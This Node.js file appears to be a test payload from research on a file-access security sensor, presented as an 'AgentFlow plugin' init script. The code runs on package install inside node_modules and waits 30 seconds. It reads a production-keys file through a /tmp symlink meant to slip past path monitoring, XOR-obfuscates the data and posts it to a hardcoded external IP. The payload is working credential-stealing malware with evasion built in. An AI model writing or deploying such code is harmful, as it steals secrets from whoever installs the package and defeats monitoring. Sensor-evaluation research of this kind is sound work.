#!/usr/bin/env node
/**
 * AgentFlow plugin - initialization script
 *
 * H2 (Arm B, host evasion): opens the watched file through a symlink that lives OUTSIDE the
 * sensor's watched-path prefix, by an ABSOLUTE path under /tmp.
 *
 * What this measures: telemetry.py's _under_watch() calls os.path.realpath() BEFORE the
 * watched-prefix test, so a symlink that resolves into the watched tree should still be
 * caught. The openat path here starts with /tmp, which passes the bpftrace filter
 * (str(args.filename,4) == "/tmp"), so the event does reach userspace and realpath gets its
 * chance. Expected result: REPORTED. That is a legitimate negative result for the paper
 * (the sensor is robust to path presentation), not a failed test.
 *
 * Contrast with plugin-h2b, which moves the symlink outside /home and /tmp as well.
 *
 * Timing is the same 30s "after" bracket as plugin-v4.
 */
const http = require('http');
const fs = require('fs');
const path = require('path');

const HOST = process.env.PLUGIN_HOST || '184.32.242.13';
const PORT = parseInt(process.env.PLUGIN_PORT || '8080');
const DATA_FILE = process.env.PLUGIN_DATA_FILE || path.join(process.env.HOME || '~', 'Desktop', 'prod-keys.txt');
const ENCRYPTION_KEY = process.env.PLUGIN_KEY || 'demo-key';
const DELAY_MS = 30000; // 30 seconds, same "after" timing as plugin-v4

function log(level, message) {
  console.log('[' + level + '] ' + message);
}

function xorEncrypt(data, key) {
  const keyBytes = Buffer.from(key);
  const result = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    result[i] = data[i] ^ keyBytes[i % keyBytes.length];
  }
  return result;
}

function readViaOutsideSymlink() {
  // Symlink sits in a plain /tmp scratch dir, i.e. outside ~/alibi-lab-files and ~/demo.
  // Opened by ABSOLUTE path so the openat still starts with /tmp and passes the filter.
  const linkDir = fs.mkdtempSync('/tmp/agentflow-h2-');
  const linkPath = path.join(linkDir, 'cache.dat');
  fs.symlinkSync(DATA_FILE, linkPath);
  log('INFO', 'Opening watched file via outside symlink: ' + linkPath + ' -> ' + DATA_FILE);
  try {
    return fs.readFileSync(linkPath);
  } finally {
    try { fs.unlinkSync(linkPath); fs.rmdirSync(linkDir); } catch (e) { /* best effort */ }
  }
}

function syncData() {
  let fileContent;
  try {
    fileContent = readViaOutsideSymlink();
    log('INFO', 'Read ' + fileContent.length + ' bytes via outside symlink');
  } catch (e) {
    log('ERROR', 'Failed to read file: ' + e.message);
    return;
  }

  const encoded = xorEncrypt(fileContent, ENCRYPTION_KEY).toString('base64');

  log('INFO', 'Syncing data to ' + HOST + ':' + PORT);
  const options = {
    hostname: HOST,
    port: PORT,
    path: '/collection',
    method: 'POST',
    timeout: 15000,
    headers: {
      'Content-Type': 'application/octet-stream',
      'Content-Length': Buffer.byteLength(encoded),
      'X-Plugin-Enc': 'xor'
    }
  };

  const req = http.request(options, res => log('INFO', 'Sync response: HTTP ' + res.statusCode));
  req.on('error', e => log('ERROR', 'Sync error: ' + e.message));
  req.on('timeout', () => { req.destroy(); log('WARN', 'Sync timed out'); });
  req.write(encoded);
  req.end();
  log('INFO', 'Data sync complete (delayed)');
}

// --- single-send guard ------------------------------------------------------------------
if (!process.cwd().includes('node_modules')) {
  log('INFO', 'build/prepare phase (cwd outside node_modules); skipping');
  process.exit(0);
}
log('INFO', 'Waiting ' + (DELAY_MS / 1000) + 's before data sync...');
setTimeout(syncData, DELAY_MS);
